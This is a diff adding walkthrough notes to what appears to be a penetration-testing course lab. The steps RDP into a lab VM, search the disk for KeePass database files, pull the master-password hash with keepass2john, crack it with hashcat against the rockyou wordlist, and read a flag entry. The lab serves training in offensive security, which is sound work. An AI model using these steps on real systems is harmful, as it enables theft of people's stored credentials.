@@ -75,7 +75,33 @@ Password list after successful entering the Master Password
 
 Lab 1 - Follow the steps outlined in this section to obtain the master password of the KeePass database on VM #1 (SALESWK01). Enter the password found with the title "User Company Password".
 >``` shell
+>xfreerdp3 /u:jason /p:lab /v:192.168.241.203 /cert:ignore
 >
+># Open powershell
+>
+>Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
+>> Select DisplayName
+>
+>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+>
+>(Manual step) Copy the KeePass database from Windows to Kali: C:\Users\nadine\Documents\Database.kdb
+>
+>keepass2john Database.kdbx > keepass.hash
+>
+>sed -i 's/^.*\$keepass/\$keepass/' keepass.hash
+>
+>cat keepass.hash
+>
+>hashcat --help | grep -i keepass
+>
+>hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
+>-r /usr/share/hashcat/rules/rockyou-30000.rule
+>
+>hashcat -m 13400 keepass.hash --show
+>
+># (On Windows) Open KeePass and unlock Database.kdbx using the cracked master password (example: pinkpanther1234)
+>
+>#In KeePass, locate the entry with Title "flag" and copy the PASSWORD field: This value is the answer to the exercise (note: not formatted as OS{}).
 >```
 >
 
